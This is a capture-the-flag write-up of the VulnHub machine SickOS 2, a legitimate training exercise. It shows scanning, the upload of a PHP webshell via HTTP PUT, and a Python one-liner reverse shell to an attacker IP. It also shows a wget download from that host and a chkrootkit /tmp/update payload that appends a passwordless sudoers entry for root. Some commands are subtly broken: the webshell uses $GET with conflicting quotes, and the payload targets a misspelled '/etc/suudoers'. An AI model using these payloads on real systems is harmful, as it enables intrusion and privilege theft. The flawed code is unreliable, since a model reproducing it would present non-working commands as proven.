---
title: "SickOS 2"
date: 2024-07-26
draft: false
summary: "Writeup for SickOS 2 CTF challenge on VulnHub."
tags: ["linux", "file upload", "chkrootkit"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/sickos2/cover.webp"
  caption: "SickOS 2 VulnHub Challenge"
  alt: "SickOS 2 cover"
platform: "VulnHub"
---

This is the second challenge in the SickOS series. The scope of SickOS2 is to gain the highest privilege on the system.
<!--more-->
To download **sickos 2**, click on the link given below:
- https://www.vulnhub.com/entry/sickos-12,144/

## Reconnaissance

I started by scanning the network to identify the target IP.

```bash
nmap -sn 192.168.1.0/24                                      
```

I then performed an **nmap** aggressive scan to identify open ports, services and additional information about the services running on the target.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN sick2.nmap
```

| **Port** | **Service**            |
| -------- | ---------------------- |
| 22       | ssh                    |
| 80       | http                   |

![](https://cdn.ziomsec.com/sickos2/1.webp)

## Foothold

Since the target had port 80 open, I accessed it on the web and also viewed its source for anything interesting.

![](https://cdn.ziomsec.com/sickos2/2.webp)

```shell
curl http://TARGET
```

![](https://cdn.ziomsec.com/sickos2/3.webp)

However, there was nothing interesting. So, I used **dirb** to fuzz the application for hidden files and directories.

```shell
dirb http://TARGET
```

![](https://cdn.ziomsec.com/sickos2/4.webp)

Fuzzing the application revealed a directory called *test* which had a directory listing.

![](https://cdn.ziomsec.com/sickos2/5.webp)

I then performed a **nikto** scan on this path to see if I could find anything juicy.

```shell
nikto -h http://TARGET/test/
```

![](https://cdn.ziomsec.com/sickos2/6.webp)

The **nikto** scan revealed that the server allowed **HTTP PUT** method.  This meant that I could upload a PHP reverse shell file on the target and if the file was executed, I could get a reverse shell.

I validated this using the **OPTION** method:

```shell
curl -v --request OPTIONS http://TARGET/test
```

![](https://cdn.ziomsec.com/sickos2/7.webp)

After validating if the method was allowed, I uploaded a php webshell to get remote code execution.
- I referred to this article:- https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html

```shell
curl -X PUT -d  '<?php system($GET['cmd']); ?>' http://TARGET/test/revshell.php
```

```shell
curl http://TARGET/test/revshell.php?cmd=whoami
```

![](https://cdn.ziomsec.com/sickos2/8.webp)

Hence, with this - I was able to execute system command. I then used this to obtain a reverse shell.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.13",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![](https://cdn.ziomsec.com/sickos2/9.webp)

```shell
rlwrap nc -lnvp 443
```

![](https://cdn.ziomsec.com/sickos2/10.webp)

I got access as a the http service account - *www-data*. For a better and more interactive shell, I spawned a pty shell using **python**.

```shell
export TERM=xterm
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn.ziomsec.com/sickos2/11.webp)

## Privilege Escalation

I downloaded the **linux smart enumeration** script to assist with privilege escalation.
- https://github.com/diego-treitos/linux-smart-enumeration

![](https://cdn.ziomsec.com/sickos2/12.webp)

```shell
wget 'http://192.168.1.13:8080/lse.sh'
chmod +x lse.sh
```

![](https://cdn.ziomsec.com/sickos2/13.webp)

This script revealed that I had permissions to write in the paths present in cron jobs.

![](https://cdn.ziomsec.com/sickos2/14.webp)

When I listed the `cron.daily` folder contents, I found **chkrootkit**. This software is used to scan the system for rootkits. Since it requires scanning the applications, it is run as root. So, if there was an exploit available for this, I could run any command as root and escalate my privilege.

![](https://cdn.ziomsec.com/sickos2/15.webp)

I used **searchsploit** and found an exploit for **chkrootkit**.

```bash
searchsploit 'chkrootkit'
```

![](https://cdn.ziomsec.com/sickos2/16.webp)

I checked the version of the **chkrootkit** script to determine if the available exploit would work.

```shell
head chkrootkit
```

![](https://cdn.ziomsec.com/sickos2/17.webp)

I then downloaded the text file from **Searchsploit** and reviewed it to understand how I could escalate my privileges.

```shell
searchsploit -m linux/local/33899.txt
```

![](https://cdn.ziomsec.com/sickos2/18.webp)
![](https://cdn.ziomsec.com/sickos2/19.webp)

So, all I had to do is add some malicious code inside a file called *update* in the */tmp* directory and run it using **chkrootkit**.

```bash
echo 'chmod 777 /etc/suudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 400 /etc/sudoers' > /tmp/update
cat /tmp/update
```

![](https://cdn.ziomsec.com/sickos2/20.webp)

> I used the update binary to modify the *sudoers* file so that my current user could run sudo commands without a password.

![](https://cdn.ziomsec.com/sickos2/21.webp)

I then waited for a few minutes and switched the user to root.

![](https://cdn.ziomsec.com/sickos2/22.webp)

Finally, I captured the flag from the root directory.

![](https://cdn.ziomsec.com/sickos2/23.webp)

## Closure

Here's a brief summary of how I pwned **SickOS 2**:
- I uploaded a PHP file for remote command injection in the _/test/_ folder.
- I used this remote code execution (RCE) to obtain a reverse shell.
- I then inspected the `cron.daily` folder and exploited the **chkrootkit** vulnerability to gain root access.
- Finally, I captured the flag from the _/root_ directory.

That's it from my side. Until next time:)

---
